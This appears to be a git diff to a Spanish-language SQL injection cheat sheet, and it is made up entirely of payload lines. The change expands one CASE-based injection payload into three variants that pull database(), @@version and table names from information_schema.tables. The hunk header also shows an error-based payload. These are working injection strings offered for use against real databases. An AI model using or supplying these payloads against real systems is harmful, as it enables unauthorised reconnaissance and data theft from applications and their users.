@@ -912,7 +912,13 @@ SELECT * FROM (SELECT count(*), CONCAT((SELECT database()), 0x23, FLOOR(RAND(0)*
 
 ### Sql inyection case
 
-`SELECT CASE WHEN (1=1) THEN table_name ELSE '<a href=https://twitter.com/_Y000_>_Y00!_</a>' END from information_schema.tables`
+```
+SELECT CASE WHEN (1=1) THEN table_name ELSE '<a href=https://twitter.com/_Y000_>_Y00!_</a>' END from information_schema.tables
+
+SELECT CASE 4 WHEN 1 THEN database() WHEN 2 THEN @@version WHEN 3 THEN table_name ELSE '_Y000!_' END FROM information_schema.tables
+
+SELECT CASE WHEN 1>0 THEN table_name ELSE '_Y000!_' END FROM information_schema.tables
+```
 
 ### Sql inyection payload usando upper + reverse + right + sounds like
 
